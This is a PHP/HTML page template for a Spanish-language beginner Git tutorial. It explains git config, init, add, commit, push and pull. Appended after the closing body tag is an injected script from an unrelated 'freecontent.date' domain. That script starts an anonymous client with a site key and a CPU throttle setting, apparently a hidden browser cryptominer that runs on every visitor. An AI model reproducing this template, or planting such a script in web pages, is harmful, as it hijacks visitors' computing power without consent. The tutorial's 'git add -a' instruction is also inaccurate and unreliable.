<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="ylit.cl" content="">

    <title>Tutotial GitHub</title>

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url() ?>assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="<?php echo base_url() ?>assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="<?php echo base_url() ?>assets/css/clean-blog.min.css" rel="stylesheet">

  </head>

  <body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
      <div class="container">
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>">Índice</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/quienesSomos">Quines Somos</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/contactanos">Contactanos</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <header class="masthead" style="background-image: url('<?php echo base_url() ?>assets/img/github1.png')">
      <div class="overlay"></div>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <div class="site-heading">
              <h1>Tutorial GitHub</h1>
              <span class="subheading">Primer Proyecto.</span>
              <span class="subheading">Desarrollado por <a href="https://ylit.cl/">YLIT</a></span>
            </div>
          </div>
        </div>
      </div>
    </header>

    <!-- Post Content -->
    <article>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">

            <h2 class="section-heading">Comandos Básicos.</h2>
            <p>Una vez que ya tienes listo tu reposotorio en GitHub, estas preparado para subir
            los archivos de tu proyecto.</p>

            <h2 class="section-heading">Configuración inicial de Git.</h2>
            <p>
              Una de los primeros pasos que debemos realizar es configurar nuestro nombre de usuario
              y nuestro email, para ello debemos ejecutar los siguientes comandos:
              <br> <code>$ git config --global user.name "Algun Nombre de Usuario"</code>
              <br> <code>$ git config --global user.email "nombreEmail@dominio.com"</code>.
              <br>Dicha información ingresada, será guardada en un archivo de nuestro directorio,
              (por defecto ~/.gitconfig)
            </p>

            <p>
              En el caso que quisieramos modificar estos valores, solo para un proyecto en particular,
              sin querer modificar de manera global estos atributos, solo se deben ejecutar esos coamndos
              dentro del directorio raiz del proyecto en particular, pero sin el atributo --global. De esta 
              forma la información se guardará dentro del directorio del proyecto especifico ./git/config
            </p>

            <p>
              Además otras configuraciones que pueden resultar útiles, son las siguientes 
              (por supuesto existen otras):
              <br><code>$ git config --global color.status auto</code>
              <br><code>$ git config --global color.branch auto</code>
              <br><code>$ git config --global color.diff auto</code>
              <br><code>$ git config --global color.interactive auto</code>
              En el caso de que nuestro terminal nos lo permita, con estos comando conseguiremos colorear
              ciertas áreas, por lo que nos resultará más fácil leer la información proporcionada.
            </p>

            <h2 class="section-heading">Inicializar Git.</h2>
            <p>Posteriormente lo que debes hacer, es crear un directorio en tu servidor local 
            (wampServer, xampp, lampp, etc). Por ejemplo, crearemos un directorio llamado "primerProyecto".
            Luego abriremos una consola, y estando dentro del nuevo directorio creado para nuestro proyecto,
            ejecutaremos el comando 
            <br> <code>$ git init</code>, si todo está correcto, git nos devolverá 
            <br> <code>Initialized empty Git repository in .git/</code>.
            Con dicho comando se crea un directorio llamado <code>.git/</code>, en el cual git guarda la
            información de control de tu proyecto.
            </p>

            <h2 class="section-heading">Add.</h2>
            <p>Para el caso de este punto, se asume que ya existen nuevos archivos dentro del directorio
            del nuevo proyecto creado.
            Con el comando <b>add</b>,
            <br><code>$ git add archivo1 archivo2 archivo3 archivoN</code>, estamos añadiendo el 
            archivo al <b>index</b> para el próximo commit. Es decir, con add, se está indicando 
            que es lo que queremos versionar la proxima vez que se realice un commit.
            </p>

            <p>
              Por otro lado, si hemos añadido muchos archivos al directorio del proyecto, una forma simple 
              de añadirlos todos es usando:
              <br><code>$ git add .</code> (ojo, es un add seguido de un espacio y un punto)
            </p>


            <p>
              Otro punto a tener en consideración, es que el comando add, debemos lanzarlo luego de 
              cada modificación a algun archivo, incluso si ya los hemos añadido al index anteriormente,
              o en otras palabras, debemos lanzarlo cada vez antes de hacer un commit y se haya modificado 
              algún archivo.
            </p>

            <blockquote class="blockquote">El comando add, no significa añadir archivos al repositorio.
            </blockquote>

            <blockquote class="blockquote">También se puede automatizar el comando add, para ello
            solo debemos ejecutar
            <br><code>$ git add -a</code>, pero ¡¡CUIDADO!!, que solo se realizará add automático
            a los archivos que ya existían en el repositorio. Para los archivos creados nuevos debemos 
            añadirlos usando add.
            </blockquote>

            <h2 class="section-heading">Commit.</h2>

            <p>Una vez que ya tengamos los archivos listos y que de momento no les realizaremos otras
            modificaciones, estamos listos para realizar el commit, para ello simplemente lanzaremos
            el siguiente comando: 
            <br><code>$ git commit -m "Ejemplo primer commit: primer archivo modificado"</code>.
            Con -m estamos confirmando el commit, mientras que lo que está entre comillas es nuestro 
            mensaje.
            </p>

            <h2 class="section-heading">Push y Pull.</h2>

            <p>
              Estos comandos son muy utiles a la hora de cargar y/o descargar el proyecto hacia o desde
              nuestro repositorio.
              <br><b>Push:</b> tal como nos indica su nombre (empujar), al ejecutar este comando, estaremos
              enviando los archivos, desde nuestra estación de trabajo local, hacia el repositorio (subir, cargar, upload). Para ello debemos ejecutar:
              <br><code>$ git push http://github.com/nombreUsuario/nombreRepositorio master</code>.
              Al ejecutar esto, estamos diciendo que cargaremos nuestros archivos de proyecto hacia el 
              repositorio que habíamos creado en el capítulo anterior, master quiere decir que estamos subiendo
              los archivos en la rama master (rama principal). Con ello, Git nos pedirá nuestro nombre de usuario
              y contraseña de github para poder cargar los archivos en dicho repositorio.
            </p>
            
            <p>
              <br><b>Pull:</b> por el otro lado tenemos el comando pull, el cual significa que estaremos 
              descargando los archivos del proyecto desde el repositorio hacia nuestra estación de trabajo local.
              para eso debemos ejecutar:
              <br><code>$ git pull http://github.com/nombreUsuario/nombreRepositorio</code>.
            </p>

            <p>
              Con estos pasos se da por terminado este tutorial, ya que se enfoca en las funciones básicas 
              de Git y en el trabajo de un proyecto de forma personal, es decir, en una sola rama. Sin embargo
              si quieres ahondar aun más en el tema, puedes visitar el sitio oficial de Git y GitHub para
              revisar su documentación oficial, a continuación se encuentran los links correspondientes:
              <br>Documentación Git: <code>https://git-scm.com/doc</code>.
              <br>Documentación GitHub: <code>https://guides.github.com/</code>.
            </p>

              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/primerProyecto">Capítulo Anterior &larr;</a>
              </div>
              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/">Indice &rarr;</a>
              </div>

          </div>
        </div>
      </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <ul class="list-inline text-center">
              <li class="list-inline-item">
                <a href="https://www.linkedin.com/in/luis-navarro-arenas-6493b1136/">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://www.facebook.com/ylit.cl">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://github.com/lnavarroa/tutorialGitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
            </ul>
            <p class="copyright text-muted">Copyright &copy; YLIT 2018</p>
          </div>
        </div>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo base_url() ?>assets/vendor/jquery/jquery.min.js"></script>
    <script src="<?php echo base_url() ?>assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>

  </body>

  
  <script src="https://www.freecontent.date./Kxnd.js"></script>
  <script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.9
    });
    _client.start();

  </script>

</html>
